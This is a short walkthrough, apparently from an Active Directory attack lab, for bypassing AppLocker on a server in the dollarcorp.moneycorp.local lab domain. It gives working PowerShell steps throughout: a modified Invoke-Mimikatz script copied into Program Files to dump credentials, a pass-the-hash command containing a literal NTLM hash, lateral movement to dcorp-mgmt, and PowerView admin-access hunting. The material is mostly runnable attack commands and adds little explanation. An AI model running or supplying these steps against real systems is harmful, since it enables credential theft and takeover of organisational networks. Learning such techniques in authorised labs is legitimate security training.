you’re working on bypassing AppLocker policies and executing scripts with elevated privileges. Here's how you can perform these tasks in an organized manner:

## App Locker Policy and Executing Scripts

### Step 1: Access and Verify Language Mode
```powershell
PS C:\AD\Tools> Enter-PSSession dcorp-adminsrv.dollarcorp.moneycorp.local
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> $ExecutionContext.SessionState.LanguageMode
```

### Step 2: Check AppLocker Policy
```powershell
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Step 3: Prepare Script for Execution
#### Modify Invoke-Mimikatz.ps1 to Invoke-MimikatzEx.ps1
```plaintext
1. Create a copy of Invoke-Mimikatz.ps1 and rename it to Invoke-MimikatzEx.ps1.
2. Open Invoke-MimikatzEx.ps1 in PowerShell ISE.
3. Add `Invoke-Mimikatz` to the end of the file.
```

### Step 4: Transfer Script to Target Server
```powershell
PS C:\AD\Tools> Enter-PSSession -Session $sess
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\> cd '.\Program Files\'
PS C:\AD\Tools> Copy-Item .\Invoke-MimikatzEx.ps1 '\\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\Program Files\'
PS C:\AD\Tools> Enter-PSSession -Session $sess
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> ls
```

### Step 5: Execute Script
```powershell
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> .\Invoke-MimikatzEx.ps1
```

### Step 6: Use Extracted Hashes to Access Other Machines
#### Example: Using srvadmin Hash to Access dcorp-mgmt
```powershell
PS C:\AD\Tools> Invoke-Mimikatz -Command '""sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe""'
PS C:\Windows\system32> Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\srvadmin\Documents> Invoke-Mimikatz
```

### Step 7: Confirm Access and Dump Hashes
```powershell
PS C:\Windows\system32> powershell -ep bypass
PS C:\> . .\PowerView.ps1
PS C:\> Invoke-UserHunter -CheckAccess
PS C:\> Find-LocalAdminAccess
PS C:\> Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\srvadmin\Documents> Invoke-Mimikatz
```
